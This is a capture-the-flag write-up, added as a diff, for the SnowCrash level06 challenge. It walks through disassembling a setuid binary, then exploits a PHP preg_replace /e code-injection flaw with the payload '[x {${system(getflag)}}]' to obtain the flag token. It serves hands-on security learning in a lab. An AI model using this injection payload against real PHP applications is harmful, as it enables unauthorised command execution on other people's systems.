@@ -1,0 +1,79 @@
+# As always, let's check files in our home
+
+level06@SnowCrash:~$ ls -l level06 level06.php
+-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
+-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
+
+level06@SnowCrash:~$ file level06 level06.php
+level06: setuid ELF 32-bit LSB executable
+level06.php: a /usr/bin/php script, ASCII text executable
+
+# Files are owned by flag06, as always when reversing level06, the
+	executable sets its rights with setresgid and setresuid
+   0x080484da <+138>:	call   0x8048440 <setresgid@plt>
+   0x080484e5 <+149>:	call   0x80483c0 <setresuid@plt>
+
+# Then he execs /bin/php5 with our file level06.php
+   0x08048514 <+196>:	call   0x8048430 <execve@plt>
+
+# Ok so we will have to exploit the level06.php file
+
+==================================================================
+# Let's analyse the php code, this is what it does after formating
+<?php
+function y($m) {
+	$m = preg_replace("/\./", " x ", $m);
+	$m = preg_replace("/@/", " y", $m);
+	return $m;
+}
+function x($y, $z) {
+	$a = file_get_contents($y);
+	$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+	$a = preg_replace("/\[/", "(", $a);
+	$a = preg_replace("/\]/", ")", $a);
+	return $a;
+}
+$r = x($argv[1], $argv[2]); print $r;
+?>
+
+# So the script gets the content of the first arg then replace things
+	with regex
+===================================================================
+# After A LOT of struggling and searches about regex, i've found
+	an interesting statement on internet:
+
+"The /e modifier allows a second argument to be evaluated as a PHP expression.
+So if you were to do something like:
+$string = "phpinfo()";
+print preg_replace('/^(.*)/e', 'strtoupper(\\1)', $string);
+This would fire the function and print the PHP info. Depending on how the search is set up, you can modify to print properly."
+
+"Your payload is inside double quoted strings, so just injecting any PHP code will not work, as it will be treated as string, not as code. You may think that simply escaping the string via " would solve your problem, but that will not work, as double quotes are escaped in all references
+[...]
+The code that will be evaled is:
+strtoupper("${passthru($_GET[x])}")"
+
+# This being said, i know that i have to meet the condition of my regex so my function
+	will be fired
+	From https://regex101.com i managed to make my regex match:
+		[x ${system(getflag)}]
+
+level06@SnowCrash:/tmp$ php test.php /tmp/test
+PHP Notice:  Undefined offset: 2 in /tmp/test.php on line 15
+[x ${system(getflag)}]
+PHP Parse error:  syntax error, unexpected '(' in /tmp/test.php(7) : regexp code on line 1
+PHP Fatal error:  preg_replace(): Failed evaluating code:
+y("${system(getflag)}") in /tmp/test.php on line 7
+
+# >:(
+# Well, my function is well executed but why doesnt it prints my flag !
+===================================================================
+# After researches (AGAIN), i found the ultimate statement about this:
+
+" So, for a simple variable, single {} will work, like "{$foo}", but phpinfo() is a function, when you need to call it, you need two {}, which your example "{${phpinfo()}}", which will call phpinfo() function.
+
+level06@SnowCrash:~$ echo '[x {${system(getflag)}}]' > /tmp/test
+level06@SnowCrash:~$ ./level06 /tmp/test
+[...]
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+[...]
